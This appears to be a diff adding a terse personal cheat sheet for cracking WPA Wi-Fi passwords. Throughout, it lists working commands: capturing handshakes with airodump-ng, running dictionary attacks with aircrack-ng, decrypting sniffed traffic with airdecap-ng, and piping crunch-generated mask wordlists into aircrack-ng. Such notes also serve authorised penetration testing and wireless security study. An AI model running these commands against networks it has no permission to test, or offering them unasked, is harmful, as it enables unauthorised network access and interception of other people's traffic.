@@ -1,0 +1,29 @@
+1) storing captures in a file::::::::
+   
+   airodump-ng --bssid mac_addr --channel channel_number --write Desktop/Captures/Filename.txt wlan0mon
+
+2) using dictionary attack:::::::::
+
+   aircrack-ng Desktop/Captures/wpasample.cap -w Desktop/lists/top_passwords.txt            //first one is captured file and second is password text file 
+
+3) making decryption  of sniffed data::::::::::::
+       :::in terminal:::
+                   cd Desktop/Captures/
+                   airdecap-ng -e 'name_of_wifi' -p password_here wpasample.cap                //now you will see decrypted information
+
+4) CRUNCH------------->  >>>>>>> >  to get indo type -> man crunch
+
+5) most useful argument -------->   -t  :::::
+     
+       ^ to insert symbols
+       @ lower case characters
+       % numbers
+       , upper case caharacters
+
+                       --------->   -f _-_> charset.lst (this is in crunch folder,diff combination ,copy and paste names) 
+           
+6)cracking using CRUNCH
+
+     crunch 11 11 -t %%%%Thunder 1234567890 | aircrack-ng -w - wpascan.cap -e 'nameofwifi'
+
+7)   crunch 11 11 -t %%%%,hunder -f charset.lst mixalpha-numeric-space | aircrack-ng -w - wpascan.cap -e 'name'
